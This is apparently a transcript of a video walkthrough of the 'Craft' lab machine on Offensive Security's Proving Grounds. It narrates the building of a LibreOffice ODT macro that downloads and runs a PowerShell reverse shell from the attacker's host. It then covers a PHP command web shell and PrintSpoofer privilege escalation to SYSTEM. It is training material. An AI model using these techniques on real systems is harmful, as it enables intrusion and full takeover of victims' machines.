https://www.youtube.com/watch?v=0Am8mzOXTVk&t=1269s

00:00:01 - 00:01:16
hello guys this is siren with offensive security and welcome to another walkthrough today we're going to be working on a machine called craft it's available from offensive Securities Proving Grounds uh more over the PG practice tab so it is a Windows machine and I think personally that it demonstrates some important Concepts that would be worth sharing so we're going to go ahead and jump into that I'm just going to switch my source over to the streaming and I'll show you I mean I already have uh the IP


00:00:39 - 00:02:00
here we're just going to copy the IP from Proving Grounds move it over to Cherry Tree and I'll paste it as plain text there we go we're also going to export this as an environment variable within uh within our terminal so I got my IP there and now if we Echo IP with the dollar sign in front we are ready to go with tooling cross tooling and such uh you'll see I've already set up a file for hashes users uh two directories for vulnerabilities uh any files retrieved or exfiltrated but with no further Ado


00:01:20 - 00:02:36
let's go ahead and do some end mapping nm- p- for all 65,535 ports we're going to do- SCC for simple scripts and- SV for service version going to do that on the target IP and tag on a D- open and what the D- open will do is it'll open it'll tell in map that we're really only interested in open ports not filtered not closed and it will speed up the full port scan so I'm going to go ahead and do that um and it looks like it's saying it's blocking our probes may want to try PN all right


00:01:56 - 00:03:08
then let's go ahead and Tack on a PN and let that go so I'll be back uh I'm going to go ahead and pause the video we're going to blip through time and uh we're going to get our in map output and we're going to get it into cherry tree and take a look at what we have okay so we're back and our in map scan has completed and to our surprise only Port 80 is open so if we're getting into this machine it's going to be through Port 80 let's go ahead and still get that over into the inmap results


00:02:37 - 00:03:55
section of our notes and let's start taking a look so 80 HTTP looks like Apache 2448 nothing crazy there but we have 164 op SSL 1.1 yeah one that's that's a little suggestive but nonetheless we're going to put up here that our web technology is PHP because uh that's what we we found here PHP 8.0.6 and that the target machine is 164 so I don't know exactly what we have but I know that we have a Windows uh 64-bit OS and uh that is that is enough to go from there and then the title of the


00:03:19 - 00:04:40
machine craft so I've already got burp Suite open I also have Firefox I'm going to go ahead and grab the IP address clear this out now that we've stored it let's Echo the IP copy it load it into Firefox and let's just see what's on P 80 let's just see what we got once it decides to load 10 wait that's I just plugged in my IP I am so silly so what we're going to do is grab this IP I am sorry I'm sorry what we're going to do is plug in the Target machine IP and we'll see where


00:04:08 - 00:05:31
that goes H you'll have to excuse me um but that is the target IP though no I echoed it out right yeah it's just taking a little while okay so I didn't do it wrong it's just taking its time let's take a look at burp maybe we have ah proxy enabled so this is something you want to be aware of right um make sure when you start up burp that your intercept is off now let's see and there it is cough cough so what we're going to do is notice down here at the very bottom obviously we have a very uh let's see


00:04:49 - 00:06:05
you know craft Laurel ipsum so not suggestive of too much you know custom content um I don't see that we'll be generating our own word list there's not even Port 20 or 22 or any SSH Services there's no remote shell services or secure shell services available to us nor RDP uh we do have admin at craft uh. offc but I'm thinking the thing here is this it says join our team submit your resume so it says pick a file and upload I'm just going to test this I'm going to test with the text file that goes siren


00:05:26 - 00:06:54
was here out to let's just put put in my documents say uh testing. text and we'll go back to Firefox browse and uh we're going to go to our documents we're going to upload that file that we just created the text document open it and we're going to submit that post data file is not valid please submit an ODT file we enlarge the font size so our viewers can uh see that more clearly more legible but please submit an ODT file so an ODT file for those that are not aware is associated with Libra


00:06:12 - 00:07:40
office now the thing that I'm thinking here is what if we just make a default kind of ODT file and and we give that a submit and see what happens so I'm going to clear this out and that is going to mean that you're going to need liy office on your machine so to install it on your machine you know we would app- and install D yes liary office writer now I already have this installed mine's already installed but that is what you would need to move forward with this walk through once that's done um I'm going to


00:06:57 - 00:08:14
go ahead and just open a new terminal here bring it down we're going to type libery office and let's launch it so you can see I got a few documents here security security matters we're going to open a new writer document and you know what thank you li office for the tip but but we're doing a a recording right now so we're going to go to tools macros and the reason I want to do this let me just explain the reasoning behind this join our team submit your resume my guess is that this machine is meant to


00:07:35 - 00:08:52
simulate somebody in an internal environment this is important guys in an internal environment opening a document right and we can only ha I mean I could send an ODT document over there and upload that just fine the problem is um nothing is going to happen so we're going to have to do a few fancy things we're going to have to do a few fancy things and uh we're going to go to tools macros and organize macros basic and I'm kind of just going to leave this as Untitled you can do whatever you like with it but on the


00:08:14 - 00:09:38
right side here we're going to click new uh I'll call this offs SEC one and uh we'll click okay so this is kind of very reminiscent of what you know might be Visual Basic we might recognize that as Visual Basic so something I want to do uh a good way to test if a document is being opened or has been opened is just with Powershell actually excuse me I had to cough um but what we're going to do is uh just Tab out and we're going to type shell so everything inside here is going to be a


00:08:58 - 00:10:22
shell command and let's say CM d/c that's going to denote the command and we're going to say Powershell iwr but we're going to need our IP address this time so we're going to if config on ton zero and I'm going to GP Das I inet and we're going to grab this copy it this is our VPN IP so we're going to jump back to labor office and is really just as simple what this is going to do is perform a uh HTTP request uh just to our IP and if we're hosting on Port 80 by default then and this is


00:09:40 - 00:10:48
open then you know it should execute there is something else we're going to need to do we're going to need to go to file and save the document and we'll call this offse SEC one and hit the save button we're going to close out of this and let's jump back into libary office and you do want to make sure you save this document as well but we're not just finished just yet there's something else we're going to need to do we're going to need to attach the macro or the script


00:10:13 - 00:11:37
or the code that we just made to uh an event that pertains to the document thankfully we can do that what we're going to do is go back to tools we're going to go down to customize and over here under the events tab we're going to click on Open document and click on the macro button and then here is our offc 1. ODT I'm going to double click that standard double click that expand that tree and then we have our macro name it's just we it was a main function so macro name is main uh but we titled that offs SEC one


00:10:58 - 00:12:08
we're going to hit okay and now notice what happens Open document is assigned an action that's assigned an action so many complex documents out there for various organizations are going to have complex Excel spreadsheets Word documents that have charts are pulling down real-time data you know really big stuff so this this functionality is fairly standard quite frankly but Open document and that's going to pertain to the launching of our code which has a Powershell command which is going to


00:11:32 - 00:12:45
connect uh to our Target or our our uh attacking machine on Port 80 if all goes well I would imagine that's the point of the machine uh we have a hint that the name of the machine is craft and we can only upload one type of document now could we certainly intercept this in burp and try and change it over to a PHP extension for file upload vulnerabilities we certainly could but I'm going to try for the sake of time to keep us on track so once this is done I'm going to make sure to save my


00:12:09 - 00:13:35
document there we go we're going to hop back to Firefox actually we're going to go back here we're going to go back to our uh terminal and I am going to say python DM simple HTTP server on Port 80 and now we're listening on any port 80 so I'm going to bring this over here I'm going to hit the browse button and there's our offse SEC 1. ODT document we're going to hit open and let's see what happens if we upload this your resume was submitted it will be reviewed shortly yep by our


00:12:53 - 00:14:07
staff so the staff is going to take a look at our resume uh very shortly and uh and there we go so somebody just opened our document and we have a get to forward slash and that was a code 200 so now we know we have execution on the target machine in the event that somebody opens this document which they certainly have they probably think it's buggy or something because you know there's there's there's no content in it they probably just closed out but we're going to go ahead


00:13:31 - 00:14:38
and do something a little different this time around we're going to make a new document so I'm just going to close out a Libra office I'm going to reopen it from scratch from scratch guys from scratch and we're going to go just as we did wrer document we're going to go to tools macros organize macros basic down here we're going to expand this we're going to say new and we're going to call this offs SEC 2 hit the okay button now we're going to do something a little bit different not


00:14:04 - 00:15:35
too much different nothing really too different here we're still going to be calling upon the shell here and we're going to still be using powers shell so we're going to say CM d-c or for SLC and uh that command is going to be Powershell same as it was iwr iwr and we're going to need r i address again on Port 80s so let me just hop back here um if config on t zero copy this back to Libra and if we put this in here on Port 80 uh then we're going to be good to go but what my point is with


00:14:49 - 00:16:29
this is that we can now retrieve files okay we can now retrieve files so for the time being I'm kind of just going to to put this on hold I want you to put this on hold um and and we're going to just hit up Google uh for a moment and then basically what we're going to do is uh Google for invoke Powers shell here it is TCP oneliner and you can see we have a GitHub here yeah and we're just going to open this up in raw and we're going to copy over this code everything through here let's copy


00:15:43 - 00:16:57
all of that everything for the client and that should work I'm just going to go ahead and minimize this minimize this and this time get this we're going to touch offse sec. PS1 now we're going to Nano offc . PS1 and much like with any other rev shells or things like that much like any other rev shell commands Powershell is really no different here we're going to be replacing the hardcoded IP address uh with our own of our own attacking machine so if config t zero we going to grab our inet


00:16:20 - 00:17:48
address and I'm going to be listening on Port 9090 for a reverse Shell let's see if there's anywhere on we need to put that scrolling along no that looks good and there it is so I'm going to exit out of this one and basically what the idea is that we're going to have the target machine is going to open our document it's going to trigger a macro which is going to call upon Powershell Powershell is going to essentially connect an output similar to W get very similar to WG it's going to connect and we're going


00:17:04 - 00:18:33
to Output our file to a uh known writable location for Windows 64-bit and kind of cross our fingers on that one I think this will make a lot more sense uh once we get down to the nitty-gritty so what I'm going to do is throw up a simple HTTP server again python - M for module and we're going to call in simple HTTP server an argument of Port 80 I'm also going to establish a netcat listener ahead of time in a separate terminal and we're going to say we want that to uh listen for dashn it's going


00:17:48 - 00:19:01
to be numeric IP lvp on 9090 so listen verbos Le on Port 9090 good so we have this ready for for retrieval and this ready for our shell we're already ready to go the problem is we need to go ahead and head back to the document you can see I got ahead of myself earlier but at least we're ahead of the game so let's go back to our macros I think I actually have it open yep sure do so this time on Port 80 slash you guessed it what we're going to get at is offse sec. PS1 just like WG or something we're


00:18:25 - 00:19:41
going to provide d o as an output format and we're going to say output to C Windows what temp tasks let's go to tasks and offs sec. PS1 but we're not done just yet that's just going to do you know that's just going to essentially download and output uh what what we're hosting here our Powershell script our Powershell reverse shell so we're going to need to actually execute that as you guessed and that's going to take another shell command so C and D close the the parenthesis and


00:19:03 - 00:20:24
we're going to say Powershell I'm sorry for anybody who finds this hard to read I find it hard to read um I just can't find a way to actually increase the font size inside of Labor office it's ridiculous uh for legibility so that's kind of why I'm reading this out here we have CMD for SLC Powershell and this time we're just going to go ahead and call upon it and say execute so- C and we're going to go we say we put that in Windows tasks and uh offse sec. PS1 let's review our code here it looks


00:19:44 - 00:21:09
good to me looks good to me so we're going to go ahead and hit file then we're going to click save just as we did before this time we're going to call it offsec 2. ODT we're going to save that and close out of this Visual Basic editor and we still need to do one thing we need to go to tools and customize so that when you know human resources or whatever it is opens the document cough cough um well I think you get where this is going so we're going to find the Open document event and uh we're going to find it see


00:20:26 - 00:21:37
it is very it's even hard for me to read document Open document where are you there you are open document probably people screaming siren it's right there then we're going to click macro we're going to go back down double click double click offs SEC 2 and we're going to select our macro and you see now assigned action to this event is going to be to execute our macro we're going to hit okay we going to go to file and we're going to save the document wonderful so I'm going to close out of


00:21:07 - 00:22:34
this and uh let's hop back to Firefox let's go back to the main index page the web rout and we're going to click on browse this time select offset 2. ODT and hopefully HR is kind this time around and uh you know they reopen it just because it was just a hiccup the first time around it's just a hiccup we're gonna hit upload now assuming everything goes well I think you see how this is going to work we're going to have a get to here and then we should get a reverse shell guys there it is offs sec. PS1 let's see


00:21:55 - 00:23:11
if they open the document it doesn't look like it let's review let's review something so I've unpaused here I had to figure out what was wrong um sure enough when I made the PS1 file I found that there was a new line you really want to make sure that this is all on one line and that there's no trailing uh spaces with your uh PS1 file and if you save that out uh and then we exit this let's go ahead and try and re-upload that now so if you're wondering why it's not


00:22:39 - 00:24:03
working on your end just make sure uh that there's it's the payload is very clean uh that's something we want to always check so let's browse offsec 2. ODT hit upload and now we should get a get and let's see what happens I hope that makes sense if you have any questions you can ever ask me but uh you can always ask me I should say we're just going to wait P hello so it got it immediately and connect to and if I'm correct if I type something like dur yeah we're in business we are in


00:23:24 - 00:24:45
business and we have a shell on the remote machine how nice is that uh that's pretty cool so now we have a shell on the machine and we're going to need to uh do a little bit of exploration we're need to start doing some windows post uh exploitation enumeration see we have Java xamp Windows 10 upgrade um let's take a look at who I am first let's type who am I says I'm the Cyber geek so let's do net users and take a little closer look at what's going on we have an administrative user


00:24:05 - 00:25:30
guest default you know all the defaults and then we have Apache which is pretty interesting um Let's Run net user uh the Cyber geek and let's see who we are here are we a member of admin no we're not we're just users nothing special um what about net user Apache still just a member of users so we might be able to do prives as the Apachi user but uh I just want to gather a bit of you know information so let's type like CIS System Info let's let that go this is all the type of stuff that


00:24:49 - 00:26:13
you would just generally check out like which which patches are installed which are not and so on and so forth um let's go ahead ahead and uh do you know who am iall okay checking for things here n Authority authenticated users mandatory groups um anything special reboot privs anything like that not particularly is W Mech present on the machine sure enough is so if we wanted to start enumerating out Services checking for B B paths uh you know unquoted Ben paths and things like that we could certainly do that


00:25:34 - 00:27:25
with things like w mck and ials um but let's do a little bit of manual uh we have examp program files let's check program files CD program files okay so there's Libra office that makes sense nssm 2.24 V whereare makes sense okay so nssm we could definitely take a look at in a bit um let's see program files x86 and nothing too exotic standing out here nothing too exotic at all uh let's go to our desktop is there anything maybe on there like a link file or something desktop well there's a local flag so awesome


00:26:34 - 00:28:14
there and let's check out uh you know can we can we write to this location Echo write test out to let's just call it WR test. text and no so we don't have privileges to really write anything fortunately for us I do know of a location that we can write and putting some pieces together that we have the Apache user here we might be able to do something similar to what we did before to retrieving a shell um but we're going to need in essence let's take a look at examp so one thing we could


00:27:26 - 00:28:55
do is we could go to HT docs and let's see if we have right privileges here let's Echo right test out to data and we do type data okay so we can we certainly can um that means what we could do in essence since Apache is here and the Apache user is present uh we might be able to get some escalation and move laterally on this Windows machine to another user and then escalate vertically uh to something well greater the problem is if I were to Echo out you know uh like PHP system uh dollar signers or get


00:28:11 - 00:29:20
CMD that it would not be running and then you know we could place this as CMD PHP and this would essentially be the web rout right here's our index.php and upload we could then do that the problem is that wouldn't be executed by Apache so what we're going to need to do is something a little different let's bring back our other shell here cool thing about Terminator for those who asked on LinkedIn and such uh I I actually use Terminator not t-x um but we're going to close out of this and we're going to


00:28:46 - 00:30:07
touch CMD PHP we are going to Nano cd. PHP I'm going to put this in preserve statements so we can preserve spacing and that'll just make things more legible if we go through the web browser and we'll say system uh go ahead and execute basically the result of our get parameter CMD and that's really it that's really all we need the idea idea here is that we're going to need this to essentially be executed by the Apache user so I'm going to save this and we are not entirely out of luck


00:29:26 - 00:31:05
um we don't actually have to go and upload a document now we have a legitimate shell on the target machine and it would be silly of us to do that but we do need to grab R IP on the ton zero interface we're going to copy that and we're going to do python DM you guessed it simple HTTP server on Port 80 and uh let's go ahead and power shell iwr HTTP paste in our IP on Port 80 /cm d.php and dash output that to well we could Dash output that would that be back slashes yeah let's do c no for slht or


00:30:14 - 00:31:37
xamp x m PP y uh slht docs and then we'll output that as cm d.php and we got it there so there's our git 200 perfect and there's our CMD PHP wonderful so now let's verify if our theory is correct that if we have something um here that's basically how we can do file transfer guys is what I'm getting across that's how we can do some file transfer uh without having to Rego through the document or anything like that we got a 200 okay on that one but what we're going to do is hop back to


00:30:56 - 00:32:19
the web browser blow it up here and let's see if our CMD PHP file is there um yeah so let's go ahead and try CMD equals who am I perfect so we've provided uh a command that's executed and sure enough guys we were correct we can move laterally to another user and see if we can escalate from there um probably hear my stomach grumbling I do apologize I have not yet had lunch um but we're going to we're going to push through it so craft Apache so how are we going to get a shell how are we going to get a shell


00:31:39 - 00:33:17
from this point we have command execution on the target machine we want a shell in essence as Apache so if you were thinking that we could essentially use Powershell here right and and in essence transfer over our offse sec. PS1 file again and then have it execute there you're entirely correct but there's something I want to show you if we type on you know who am iall let's take a look at this in closer detail guys this is like like pseudo checks or something uh when we check for our extended privileges and capabilities


00:32:29 - 00:33:57
over the machine if we tack on dashall or for SL all uh we notice we have set impersonation privilege and that's enabled so if you've done any windows esque in the past you know we already have I mean we're we're set that is that's game set match so what we're going to do is utilize something called print spoofer or print spoofer and I'll say like GitHub here it is print spoofer abusing impersonation uh privileges or impersonation tokens so there we are uh this is this


00:33:13 - 00:34:38
is basically the whole solution uh see the Dos sln file we could compile that but thankfully people have pretty much already uh done that let's see what we would need to do uh- ccmd yep okay so everything is pretty standard here what we're going to do is try and find a binary with our Googling skills we're going to say uh print spoofer GitHub let's say this time uh 64bit maybe exe there we go no it's not here say print spoofer what we want let's look for the exact name print spoofer 6 4.exe on


00:34:02 - 00:35:12
GitHub aha so we got it it was under releases is what it was um but nonetheless we could uh just copy this so we're going to need to definitely copy this link um and we're going to go to our attacking machine and we're going to type WG and we're just going to pull it down to this directory here's our print spoofer 64.exe and if everything goes as planned uh we can achieve privilege escalation through print spoofer so we've got it on our Target machine the next objective is going to


00:34:37 - 00:35:59
be to transfer it to well you guessed it the the target machine which is you know ip config it's going to be this address I'm just going to note this down so let's go ahead and move on recall recall recall that we can moving on I mean we can recall that we have Apache here and we need it to execute here so as tempting as it is to execute and just transfer it we're actually just going to need to uh we're going to need to exit this we're going to lose our shell that's okay but what we're going to do is grab


00:35:18 - 00:36:35
this URI here and boom copy that what we can do is just curl we don't even have to go into the web browser let's say like who Am iall say percent 20 URL encoding oh now it works so there it is and it's straight from our terminal um what I'm going to do is we're going to need an extra terminal for this I'm just going to open this up and we're going to have netcat listening for Bose on 990 this is just for when we're ready uh to receive the shell basically hope that makes


00:35:59 - 00:37:11
sense and what we're going to do is use this curl command and we're going to say just as we did before Powershell actually we're going to say uh see we're going to need a URL encoder that will make this a lot better I use mayor web uh URL encode decode um and I'm just going to copy our URI here and we're going to need to encode this so I'm going to bump this side this I can bump up uh CMD is going to be uh this HTTP by the way CMD is going to be CMD or we could just say Powershell


00:36:35 - 00:37:57
iwr and we can go HTTP and we're going to need our IP address so let's out of this if config on ton zero and we're just transferring it that's all we're doing we're just transferring it using Powershell again the same way we've been doing on Port 80 is said this time we're going to get print spoofer 64.exe we're going to dash output that to C Windows tasks and I'll put that as print spoofer 64.exe I'm going to just encode this portion of our Command we're going to


00:37:17 - 00:38:50
encode that we're going to copy it and back on the command line we're going to curl it except instead of who am I we're just going to curl this and we're going to need that simple HTTP server up so python DM simple HTTP server on Port 80 and let's see if we get lucky here remember and just to recap the reason we did CMD PHP is because we know it's running laterally as the Apache user and further than that from our webshell enumeration we gathered with just a who am I for all that said impersonation


00:38:04 - 00:39:24
privilege token was enabled so we're going to transfer this bit of a potato uh executable and we're going to put it to a known writable location and then we're going to call on it but let's transfer it over first put HTTP here and specify Port 80 and let's go there it is perfect so it got it that's a 200 okay and it placed it in C Windows tasks print spoofer 64.exe I think we're moving somewhere now we're going to need that prce spoofer 64 to execute something as NT


00:38:44 - 00:39:50
system Authority and we need whatever it executes as n system Authority we need that to be our reverse shell good news is we still have we're going to keep I guess my point is that's why we're going to keep uh the simple HTTP server running in a terminal and have our listener ready in another terminal um I'm going to exit out of this just to clean things up there and the next command that we're going to want to execute is going to be C uh when well it's going to be C Windows tasks and we're going to


00:39:16 - 00:40:30
execute print spoofer 64.exe and what we're going to do is basically specify okay we want the command to be CMD that is command. exe SL command Powershell with uh the file we're going to be executing which is still present mind you actually we don't even need this now that I think about it we don't even need that simple HTTP server it's already transferred it's already there so we're going to go to C Windows tasks and just say offs sec. PS1 now I'm going to copy this because


00:39:54 - 00:41:17
we're going to need to URL encode our our p load here we're going to copy this just going to go back to Mayor web honestly and encode it and let's go up with our up Arrow to our curl all the way back to the CMD and we're going to paste this in now the idea here is that it's going to execute C Windows task print spoofer 64.exe as Apache which has the impersonation privileg token set and because of that we're going to be able to move vertically to NT system Authority with the command executing


00:40:35 - 00:42:07
Powershell of Windows tasks offs sec. PS1 PS1 is going to contain a Powershell reverse shell payload which should come back then as n system Authority so we're going to pull this up drum roll watch it's not going to work or something oh my God I think it did if we CD here who am I that's n Authority system guys so that's awesome uh we now have complete in total uh control over over this machine uh and and that's going to make pretty much for craft now what we're going to


00:41:27 - 00:42:56
do now that we have this privilege is we're going to go to users let's go to the administrator ad if I could type today administrator and we're going to go to the desktop there's our proof file right so you type out the proof file we're going to do an IP config though and uh type host name and who am I to evaluate our privilege shift print screen for me and I'm going to snip this little area and this would be used as evidence and proof in your formal report guys uh but with that being said uh thank you so


00:42:12 - 00:43:31
much for following along with me I just want to pull one thing up if we go to offensive security.com we have two new courses the sock 200 and the web 200 I'm proud of very much both of these but I did have a hand uh in the web 200 as many of you know already and uh we're very excited about it with a lot of stuff that is still on the way with the web 200 and the sock 200 so always check that out check out the events and uh yeah but with no further Ado guys thank you for very much for being here um I


00:42:51 - 00:44:08
have confirmed for the community that myself and Falcon spy will be back on twitch.tv in quarter 1 of 2022 that may not be immediately out of the gate you know everyone's coming back from New Years and such and so on we want to give people a little bit of time but that is the plan so we're excited uh I'm going to keep uploading every week until uh we move back to twitch but these will again be live streams over twitch.tv no worries there so thank you guys very much for all the positive support and


00:43:29 - 00:43:46
all the positive words um and we always encourage you to try harder take care

